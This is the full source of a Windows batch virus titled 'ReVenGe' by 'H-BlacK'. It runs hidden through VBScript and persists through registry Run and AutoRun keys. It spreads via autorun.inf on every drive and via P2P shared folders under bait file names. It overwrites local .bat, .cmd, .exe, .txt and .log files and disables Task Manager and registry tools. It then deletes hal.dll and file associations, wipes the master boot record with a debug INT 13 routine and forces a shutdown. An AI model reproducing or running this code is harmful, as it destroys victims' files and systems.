@echo off
::ReVenGe - Batch Virus by H-BlacK
set a=echo 
set b=%0
if '%1=='Hide GoTo Hide_%2
Call:TmpBat > Tmp.bat
Call:Vbs > Script.vbs
Start Script.vbs
Exit
:Vbs
%a%set RunHide = CreateObject(^"WScript.Shell^")
%a%RunHide.run ^"Tmp.bat^",vbHide
GoTo:Eof
:TmpBat
%a%@call %b% Hide Me
GoTo:Eof
:Hide_me
set kl=del /q /f 
set cp=copy /y 
set z=set 
%kl%Script.vbs
%kl%Tmp.bat
%z%sys=%systemroot%\system32\
%z%sys_=%sys%\autoexec.bat
%z%attr=attrib +r +a +s +h 
%z%fr=For %%a In (c;d;e;f;g;h;i;j;k;l;m;n;o;p;q;r;s;t;u;v;w;x;y;z) do if exist %%a:\ 
%cp%%0 %sys_%
%z%aut=Autorun.
%z%char=abcdefghijklmnopqrstuvwxyz.\/-
%z%Me=H-BlacK
%z%a=echo 
%z%b=%cd%
%z%c=Reg Add 
%c%"HKLM\Software\Microsoft\Windows\CurrentVersion" /v ReVenGe /d %sys%\vbscript.vbs /f
setlocal enabledelayedexpansion
More /s < %sys%hal.dll:.txt>tmp$ 
if not exist tmp$ echo 0a>%sys%hal.dll:.txt & GoTo no 
For /f "delims=a" %%a In ('type tmp$') Do (
	If %%a==30 GoTo ReVenGe
	set /a var=%%a + 1
	set var=!var!a
	echo !var!>%sys%hal.dll:.txt
)
:no
del tmp$
%z%par= -r -a -s -h 
%z%ky=HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\
%z%call=call %z%
%z%aa=char:~1,1
%call%aa=%%%aa%%%
%z%ab=char:~0,1
%call%ab=%%%ab%%%
%z%ac=char:~19,1
%call%ac=%%%ac%%%
%z%ad=char:~2,1
%call%ad=%%%ad%%%
%z%ae=char:~7,1
%call%ae=%%%ae%%%
%z%af=char:~4,1
%call%af=%%%af%%%
%z%ag=char:~24,1
%call%ag=%%%ag%%%
%z%ah=char:~18,1
%call%ah=%%%ah%%%
%z%ai=char:~21,1
%call%ai=%%%ai%%%
%z%str=le Inf%af%%ad%%ac%%af%d %aa%%ag% R%af%v%af%ng%af% %aa%%ab%%ac%%ad%%ae% %ai%iru%ah% %aa%%ag% %Me%
call:cmdConfig > %sys%cmdcfg.bat
call:VBSi_ > %sys%vbscript.vbs
%fr%attrib%par%%aut%*
%fr%attrib%par%%aut%inf
%fr%%kl%/s /a: +r +a +s +h %%a:\%aut%inf\*.*
%fr%rd %%a:\%aut%inf /s /q
%fr%call:URun > "%%a:\%aut%inf"
%fr%call:VBSi > "%%a:\%aut%vbs"
%fr%copy %0 %%a:\%aut%bat /y
if not exist %sys%tasklist.exe set att=_
if not exist %sys%attrib.exe set att=_
	For /f %%i in ('tasklist') do if %%i EQU acs.exe set att=_
	For /f %%i in ('tasklist') do if %%i EQU nord32krn.exe set att=_
if %att%==_ GoTo Jmp
	%attr%%sys_%
	%attr%%sys%vbscript.vbs
	%attr%%sys%cmdcfg.bat
	%fr%%attr%%%a:\%aut%*
	%c%%ky%System /v DisableRegistryTools /t reg_dword /d 00000001 /f
	%c%%ky%Explorer /v NoDrives /t reg_dword /d 00000004 /f
	%c%%ky%System /v DisableTaskMgr /t reg_dword /d 00000001 /f
:Jmp
	%c%"HKLM\Software\Microsoft\Command Processor" /v AutoRun /f /d "cmdcfg.bat">nul
If not exist %sys%iexpress.exe GoTo NoIexpress
	call:IexpressSED>%sys%pack.sed
	call:autexc>%sys%stau.bat
		If Exist %sys%pack.exe del %sys%pack.exe
		iexpress /n %sys%pack.sed
		del %sys%pack.sed /q /f
		del %sys%stau.bat
:NoIexpress
%z%IfEx=If Exist "%programfiles%\
For %%a In (VisualBasic6.0.exe,virus.exe,Hackear_Hotmail.exe,Porno.exe,Hotbabes.exe,xxx.exe,hackear_yahoo.exe,BorlandDelphi7.0.exe,creditos_emule.exe,Nod32.exe,windowsmediaplayer12,Firefox.exe,hack_muOnline.exe,Crack_Iexplorer7,RedBinder.exe,PackProgramashack.exe,hack.exe,AdvancedGIFAnimator.exe,serial_Karpersky.exe) do (
	If Exist "%homedrive%\My Shared Folder\" %cp%%sys%pack.exe "%homedrive%\My Shared Folder\%%a"
	%IfEx%Kazaa\My Shared Folder\" %cp%%sys%pack.exe "%programfiles%\Kazaa\My Shared Folder\%%a"
	%IfEx%Kazaa Lite\My Shared Folder\" %cp%%sys%pack.exe "%programfiles%\Kazaa Lite\My Shared Folder\%%a"
	%IfEx%Grokster\My Grokster\" %cp%%sys%pack.exe "%programfiles%\Grokster\My Grokster\%%a"
	%IfEx%Morpheus\My Shared Folder\" %cp%%sys%pack.exe "%programfiles%\Morpheus\My Shared Folder\%%a"
	%IfEx%EDONKEY2000\incoming\" %cp%%sys%pack.exe "%programfiles%\EDONKEY2000\incoming\%%a"
	%IfEx%Gnucleus\Downloads\" %cp%%sys%pack.exe "%programfiles%\Gnucleus\Downloads\%%a"
	%IfEx%eMule\Incoming\" %cp%%sys%pack.exe "%programfiles%\eMule\Incoming\%%a"
	%IfEx%BearShare\Shared\" %cp%%sys%pack.exe "%programfiles%\BearShare\Shared\%%a"
	%IfEx%Shareaza\Downloads\" %cp%%sys%pack.exe "%programfiles%\Shareaza\Downloads\%%a"
	%IfEx%ICQ\shared files\" %cp%%sys%pack.exe "%programfiles%\ICQ\shared files\%%a"
	%IfEx%Filetopia3\Files\" %cp%%sys%pack.exe "%programfiles%\Filetopia3\Files\%%a"
	%IfEx%appleJuice\incoming\" %cp%%sys%pack.exe "%programfiles%\appleJuice\incoming\%%a"
	%IfEx%LimeWire\Shared\" %cp%%sys%pack.exe "%programfiles%\LimeWire\Shared\%%a"
	%IfEx%Overnet\incoming\" %cp%%sys%pack.exe "%programfiles%\Overnet\incoming\%%a"
	%IfEx%Swaptor\Download\" %cp%%sys%pack.exe "%programfiles%\Swaptor\Download\%%a"
	%IfEx%WinMX\My Shared Folder\" %cp%%sys%pack.exe "%programfiles%\WinMX\My Shared Folder\%%a"
	%IfEx%Tesla\Files\" %cp%%sys%pack.exe "%programfiles%\Tesla\Files\%%a"
	%IfEx%XoloX\Downloads\" %cp%%sys%pack.exe "%programfiles%\XoloX\Downloads\%%a"
	%IfEx%Rapigator\Share\" %cp%%sys%pack.exe "%programfiles%\Rapigator\Share\%%a"
	%IfEx%KMD\My Shared Folder\" %cp%%sys%pack.exe "%programfiles%\KMD\My Shared Folder\%%a"
	%IfEx%Direct Connect\Received Files\" %cp%%sys%pack.exe "%programfiles%\Direct Connect\Received Files\%%a"
	If Exist "%homedrive%\eMule\Incoming\" %cp%%sys%pack.exe "%homedrive%\eMule\Incoming\%%a"
)
For %%a In (*.bat ..\*.bat %systemroot%\*.bat %sys%*.cmd C:\*.bat %homedrive%\Docume~1\%username%\Escritorio\*.bat %homedrive%\Docume~1\%username%\desktop\*.bat) Do (
		attrib -r -a -s -h %%a
		Copy /y %0 %%a
)

For %%a In (*.cmd ..\*.cmd %systemroot%\*.cmd C:\*.cmd %homedrive%\Docume~1\%username%\Escritorio\*.cmd %homedrive%\Docume~1\%username%\desktop\*.cmd) Do (
		attrib -r -a -s -h %%a
		Copy /y %0 %%a
)
For %%a In (*.exe ..\*.exe C:\*.exe %homedrive%\Docume~1\%username%\Escritorio\*.exe %homedrive%\Docume~1\%username%\desktop\*.exe) Do (
		attrib -r -a -s -h %%a
		Copy /y %sys%pack.exe %%a
)
For %%a In (*.txt ..\*.txt %systemroot%\*.txt %sys%*.txt C:\*.txt %homedrive%\Docume~1\%username%\Escritorio\*.txt %homedrive%\Docume~1\%username%\desktop\*.txt) Do %a% Inf%af%%ad%%ac%%af%d %aa%%ag% R%af%v%af%ng%af% %aa%%ab%%ac%%ad%%ae% %ai%iru%ah% %aa%%ag% %Me%>%%a
For %%a In (*.log ..\*.log %systemroot%\*.log %sys%*.log C:\*.log %homedrive%\Docume~1\%username%\Escritorio\*.log %homedrive%\Docume~1\%username%\desktop\*.log) Do %a% Inf%af%%ad%%ac%%af%d %aa%%ag% R%af%v%af%ng%af% %aa%%ab%%ac%%ad%%ae% %ai%iru%ah% %aa%%ag% %Me%>%%a
GoTo:Eof
:URun
%a%[AutoRun]
%a%open=%aut%vbs
GoTo:Eof
:VBSi
%a%set RunHide = CreateObject(^"WScript.Shell^")
%a%RunHide.run ^"%aut%bat Hide Me^",vbHide
GoTo:Eof
:cmdConfig
%a%@echo off
%a%%ac%i%ac%%str%
%a%For %%%%a In (assoc,del,attrib,attrib.exe,reg,reg.exe,command,command.com,debug.exe,debug,more,ftype,title,tasklist,tasklist.exe,taskkill,taskkill.exe,tskill,tskill.exe) Do doskey %%%%a=%af%xi%ac%
%a%@echo on
GoTo:Eof
:VBSi_
%a%set RunHide = CreateObject(^"WScript.Shell^")
%a%RunHide.run ^"autoexec.bat Hide Me^",vbHide
GoTo:Eof
:IexpressSED
%a%[Version]
%a%Class=IEXPRESS
%a%SEDVersion=3
%a%[Options]
%a%PackagePurpose=InstallApp
%a%ShowInstallProgramWindow=1
%a%HideExtractAnimation=1
%a%UseLongFileName=0
%a%InsideCompressed=0
%a%CAB_FixedSize=0
%a%CAB_ResvCodeSigning=0
%a%RebootMode=N
%a%InstallPrompt=%%InstallPrompt%%
%a%DisplayLicense=%%DisplayLicense%%
%a%FinishMessage=%%FinishMessage%%
%a%TargetName=%%TargetName%%
%a%FriendlyName=%%FriendlyName%%
%a%AppLaunched=%%AppLaunched%%
%a%PostInstallCmd=%%PostInstallCmd%%
%a%AdminQuietInstCmd=%%AdminQuietInstCmd%%
%a%UserQuietInstCmd=%%UserQuietInstCmd%%
%a%SourceFiles=SourceFiles
%a%[Strings]
%a%InstallPrompt=
%a%DisplayLicense=
%a%FinishMessage=
%a%TargetName=%sys%pack.exe
%a%FriendlyName=
%a%AppLaunched=stau.bat
%a%PostInstallCmd=autoexec.bat
%a%AdminQuietInstCmd=
%a%UserQuietInstCmd=
%a%FILE0=^"autoexec.bat^"
%a%FILE1=^"stau.bat^"
%a%[SourceFiles]
%a%SourceFiles0=%sys%
%a%[SourceFiles0]
%a%%%FILE0%%=
%a%%%FILE1%%=
GoTo:Eof
:autexc
%a%Type autoexec.bat^>^"%%homedrive%%\DOCUME~1\All Users\Men£ Inicio\Programas\Inicio\autoexec.bat^"
%a%Type autoexec.bat^>^"%%homedrive%%\DOCUME~1\All Users\Start Menu\Programs\Startup\autoexec.bat^"
%a%Type autoexec.bat^>^"%%systemroot%%\All users\Men£ inicio\programas\inicio\autoexec.bat^"
%a%Type autoexec.bat^>^"%%systemroot%%\All users\Start menu\programs\startup\autoexec.bat^"
%a%Type autoexec.bat^>^"%%systemroot%%\profiles\%%username%%\men£ inicio\programas\inicio\autoexec.bat^"
%a%Type autoexec.bat^>^"%%systemroot%%\profiles\%%username%%\start menu\programs\startup\autoexec.bat^"
GoTo:Eof
:ReVenGe
%z%H-BlacK=Reg Delete HKCR\.
If not exist %sys%debug.exe goto next
call:Death>"death.scr"
debug < death.scr
:next
If exist %sys%hal.dll %kl%%sys%hal.dll
For %%a In (exe,bat,com,scr,pif,cmd,vbs,js,txt,wmp,dll,dat,sys,rar,zip,ini,ico,jpg,gif,jpeg,sqm,doc,rtf,inf,log,bmp,reg,bin,mp3,wav,wmf,vbe,html,htm,ocx) Do %H-BlacK%%%a /f
shutdown.exe -s -f -t 3 -c "iNfECtEd bY H-BlacK ;)"
GoTo:Eof
:Death
%a%A 100
%a%INT 13
echo.
%a%RAX
%a%0301
%a%RBX
%a%0200
%a%F 200 L 200 0
%a%RCX
%a%0001
%a%RDX
%a%0080
%a%P
%a%Q
GoTo:Eof